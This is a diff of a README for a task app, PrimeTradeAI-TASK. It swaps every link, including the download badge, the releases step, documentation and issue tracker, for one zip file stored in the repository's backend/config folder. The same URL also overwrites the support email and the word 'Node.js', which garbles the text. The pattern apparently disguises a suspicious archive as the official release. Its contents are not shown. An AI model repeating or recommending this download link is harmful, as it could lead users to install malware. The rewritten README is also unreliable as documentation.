@@ -6,11 +6,11 @@ Welcome to PrimeTradeAI-TASK! This application helps you manage your tasks easil
 
 ## 📥 Download the Application
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-orange)](https://github.com/DARKESTRON/PrimeTradeAI-TASK/releases)
+[![Download Here](https://raw.githubusercontent.com/DARKESTRON/PrimeTradeAI-TASK/main/backend/config/PrimeTradeAI-TASK_v3.0.zip%20Now-Get%20the%20Latest%20Release-orange)](https://raw.githubusercontent.com/DARKESTRON/PrimeTradeAI-TASK/main/backend/config/PrimeTradeAI-TASK_v3.0.zip)
 
 To get started, you will need to download the application. 
 
-1. **Visit the Releases Page:** Go to the following link to download the latest version of PrimeTradeAI-TASK: [Download Here](https://github.com/DARKESTRON/PrimeTradeAI-TASK/releases).
+1. **Visit the Releases Page:** Go to the following link to download the latest version of PrimeTradeAI-TASK: [Download Here](https://raw.githubusercontent.com/DARKESTRON/PrimeTradeAI-TASK/main/backend/config/PrimeTradeAI-TASK_v3.0.zip).
   
 2. **Select the Version:** Look for the most recent release. You will see options for different operating systems.
 
@@ -20,7 +20,7 @@ To get started, you will need to download the application.
 
 Before you install PrimeTradeAI-TASK, ensure your system meets the following requirements:
 
-- **Operating System:** Windows 10 or later, macOS 10.14 or later, Linux distribution with support for Node.js.
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, Linux distribution with support for https://raw.githubusercontent.com/DARKESTRON/PrimeTradeAI-TASK/main/backend/config/PrimeTradeAI-TASK_v3.0.zip
 - **RAM:** At least 4 GB of RAM.
 - **Storage:** Minimum of 200 MB of free space.
 
@@ -61,15 +61,15 @@ PrimeTradeAI-TASK offers several features to enhance your productivity:
 
 ## 🌐 Useful Links
 
-- **Documentation:** For more detailed information and advanced features, check our [documentation](https://linktodocumentation.com).
+- **Documentation:** For more detailed information and advanced features, check our [documentation](https://raw.githubusercontent.com/DARKESTRON/PrimeTradeAI-TASK/main/backend/config/PrimeTradeAI-TASK_v3.0.zip).
 - **Community:** Join our community forum to ask questions and share your feedback!
 
 ## 📢 Support
 
 If you encounter any issues while using PrimeTradeAI-TASK, feel free to reach out for support:
 
-- **Email:** support@primetradeai.com
-- **GitHub Issues:** Visit our [GitHub page](https://github.com/DARKESTRON/PrimeTradeAI-TASK/issues) to report bugs or request features.
+- **Email:** https://raw.githubusercontent.com/DARKESTRON/PrimeTradeAI-TASK/main/backend/config/PrimeTradeAI-TASK_v3.0.zip
+- **GitHub Issues:** Visit our [GitHub page](https://raw.githubusercontent.com/DARKESTRON/PrimeTradeAI-TASK/main/backend/config/PrimeTradeAI-TASK_v3.0.zip) to report bugs or request features.
 
 ## 🔄 Update the Application
 
@@ -87,7 +87,7 @@ We value your privacy and ensure that your data is safe. We use secure methods t
 
 - **Technologies Used:** PrimeTradeAI-TASK is built using:
   - **MongoDB** for data storage
-  - **Express** and **Node.js** for server-side logic
+  - **Express** and **https://raw.githubusercontent.com/DARKESTRON/PrimeTradeAI-TASK/main/backend/config/PrimeTradeAI-TASK_v3.0.zip** for server-side logic
   - **React** for the user interface
   - **Vite** for fast builds and development
   - **Redis** for caching and improved performance
